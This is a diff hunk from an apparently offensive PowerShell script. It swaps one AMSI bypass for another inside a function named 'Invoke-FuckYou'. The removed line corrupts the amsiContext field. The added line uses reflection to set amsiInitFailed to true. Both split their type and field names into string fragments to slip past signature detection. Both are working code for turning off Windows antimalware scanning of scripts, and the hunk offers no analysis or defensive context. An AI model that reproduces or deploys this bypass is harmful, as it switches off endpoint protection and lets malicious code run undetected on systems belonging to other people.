@@ -184,7 +184,7 @@ function getPwd()
 
 function Invoke-FuckYou
 {
-    [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('Syste'+ 'm.Management.A' + 'utomation.Am' + 'siU' + 'tils').GetField('am' + 'siCo' + 'ntext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x42424242)
+    [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('Syste' + 'm.Ref' + 'lect' + 'ion.Bi' + 'ndi' + 'ngF' + 'lags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('Syste' + 'm.Typ' + 'e')), [Object]([Ref].Assembly.GetType('Syste' + 'm.Man' + 'agemen' + 't.Automa' + 'tion.Am' + 'siU' + 'ti' + 'ls')),('GetF' + 'ield')).Invoke('am' + 'siIn' + 'itFai' + 'led',(('NonPu' + 'blic,S' + 'tatic') -as [String].Assembly.GetType('Syste' + 'm.Refl' + 'ection.B' + 'indingF' + 'lags'))).SetValue($null,$True)
 }
 
 function Get-ImportedFunctions
